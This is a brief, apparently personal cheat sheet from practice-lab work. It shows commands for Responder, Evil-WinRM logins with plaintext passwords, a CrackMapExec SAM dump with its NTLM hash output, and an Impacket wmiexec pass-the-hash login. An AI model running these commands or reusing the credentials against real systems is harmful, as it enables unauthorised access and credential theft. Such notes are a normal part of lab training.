# Tools / ORDENAR ESTO


## Responder
`sudo responder -I tun0`

## Evil-Winrm
```
evil-winrm -i [TARGET] -u maya -p m4y4ngs4ri
evil-winrm -i 10.129.136.91 -u administrator -p badminton
```

## crackmapexec
`crackmapexec smb [TARGET] -u maya -p "m4y4ngs4ri" --sam`
...
MB         10.10.11.14     445    MAILING          localadmin:1001:aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae:::
...


## impacket
- <https://github.com/fortra/impacket>

```
impacket-wmiexec localadmin@10.10.11.14 -hashes "aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae"
```